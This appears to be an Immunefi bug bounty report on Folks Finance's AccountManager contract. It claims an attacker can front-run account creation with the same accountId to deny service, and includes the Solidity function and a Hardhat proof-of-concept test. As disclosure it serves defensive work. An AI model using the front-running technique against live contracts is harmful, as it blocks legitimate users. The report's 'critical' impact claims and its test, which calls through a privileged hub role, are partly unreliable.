# Boost \_ Folks Finance 34025 - \[Smart Contract - Medium] Malicious user can DoS the creation of every

Submitted on Sun Aug 04 2024 08:24:13 GMT-0400 (Atlantic Standard Time) by @zarkk for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #34025

Report type: Smart Contract

Report severity: Medium

Target: <https://testnet.snowtrace.io/address/0x3324B5BF2b5C85999C6DAf2f77b5a29aB74197cc>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

Malicious user can DoS the creation of every account at no cost by front running it with the same `accountId`.

## Brief/Intro

The unique bond between `accountId` and `Account` within the `createAccount` function exposes Folks Finance to a critical Denial of Service (DoS) vulnerability. This vulnerability allows a malicious user to front-run legitimate account creation requests, thereby preventing the creation of any new accounts at no cost.

## Vulnerability Details

In order to utilize the lending platform, users must create an account by invoking the `createAccount` function of the `AccountManager` contract and supplying a unique `accountId`. Below is the relevant implementation of the function:

```solidity
function createAccount(
        bytes32 accountId,
        uint16 chainId,
        bytes32 addr,
        bytes32 refAccountId
    ) external override onlyRole(HUB_ROLE) {
        // check account is not already created (empty is reserved for admin)
@>        if (isAccountCreated(accountId) || accountId == bytes32(0)) revert AccountAlreadyCreated(accountId);

        // check address is not already registered
        if (isAddressRegistered(chainId, addr)) revert AddressPreviouslyRegistered(chainId, addr);

        // check referrer is well defined
        if (!(isAccountCreated(refAccountId) || refAccountId == bytes32(0)))
            revert InvalidReferrerAccount(refAccountId);

        // create account
        accounts[accountId] = true;
        accountAddresses[accountId][chainId] = AccountAddress({ addr: addr, invited: false, registered: true });
        registeredAddresses[addr][chainId] = accountId;

        emit CreateAccount(accountId, chainId, addr, refAccountId);
    }
```

As demonstrated in the above code, if an account with the specified `accountId` has already been created, the creation request will be reverted. This design flaw permits an attacker to front-run the legitimate user's account creation by submitting a transaction with the same `accountId`. Consequently, this prevents the legitimate user from creating their account and accessing the platform.

## Impact Details

The impact of this vulnerability is critical due to the nature of the attack and its implications. A malicious user can indefinitely prevent the creation of **any** new accounts on the platform by front-running legitimate account creation requests. This results in a complete Denial of Service (DoS), rendering the platform unusable for new users. The attack requires no financial cost or sophisticated technical knowledge, making it highly accessible to attackers. As the core function of the platform is to allow users to create accounts and engage in lending activities, this vulnerability directly compromises the platform's functionality and can lead to significant financial damage to the platform.

## References

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/AccountManager.sol#L35-L57>

## Proof of concept

## Proof of Concept

To illustrate this vulnerability, add the following test under the `"Create Account"` section in `AccountManager.test.ts`:

```javascript
it.only("Should fail to create account when malicious has frontrun the leigitimate user, creating an account with the same accountId so to DoS", async () => {
      const { hub, unusedUsers: oldUnusedUsers, accountManager } = await loadFixture(deployAccountManagerFixture);
      const [user, ...unusedUsers] = oldUnusedUsers;

      // user is the malicious
      // unusedUsers[0] is the legitimate

      // Front run the creation of an account with accountId by creating an account with the same accountId.
      const userAddr = convertEVMAddressToGenericAddress(user.address);
      const refAccountId: string = getEmptyBytes(BYTES32_LENGTH);
      const createAccountFrontrun = await accountManager.connect(hub).createAccount(getAccountIdBytes("ACCOUNT_ID"), 0, userAddr, refAccountId);

      // The legitimate user who tries to create his account with the accountId, but he has been frontrunned.
      const user2Addr = convertEVMAddressToGenericAddress(unusedUsers[0].address);
      const createAccountLegit = accountManager.connect(hub).createAccount(getAccountIdBytes("ACCOUNT_ID"), 0, user2Addr, refAccountId);
      // The creation actually reverts since the malicious user has already created an account with the same accountId
      await expect(createAccountLegit).to.be.revertedWithCustomError(accountManager, "AccountAlreadyCreated").withArgs(getAccountIdBytes("ACCOUNT_ID"));

      // This process can be replayed for EVERY account creation and a complete DoS to be performed. 
    });
```
